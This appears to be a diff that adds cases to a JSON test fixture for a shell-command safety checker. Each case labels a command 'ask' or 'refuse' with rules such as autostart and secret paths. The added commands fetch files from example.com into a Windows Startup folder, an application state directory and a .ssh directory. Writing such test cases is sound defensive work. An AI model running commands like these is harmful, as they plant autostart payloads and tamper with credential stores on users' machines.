@@ -2110,6 +2110,30 @@
   {
    "cmd": "date -f /home/ana/.local/state/ember-remote/x",
    "verdict": "refuse"
+  },
+  {
+   "cmd": "wget -P '/mnt/c/Users/ana/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup' https://example.com/x.bat",
+   "verdict": "ask",
+   "classes": [
+    "system"
+   ],
+   "rules": [
+    "path.autostart"
+   ]
+  },
+  {
+   "cmd": "wget -P /home/ana/.local/state/ember-remote https://example.com/x",
+   "verdict": "refuse"
+  },
+  {
+   "cmd": "aria2c -d /mnt/c/Users/ana/.ssh https://example.com/x",
+   "verdict": "ask",
+   "classes": [
+    "secret"
+   ],
+   "rules": [
+    "path.secret"
+   ]
   }
  ]
 }
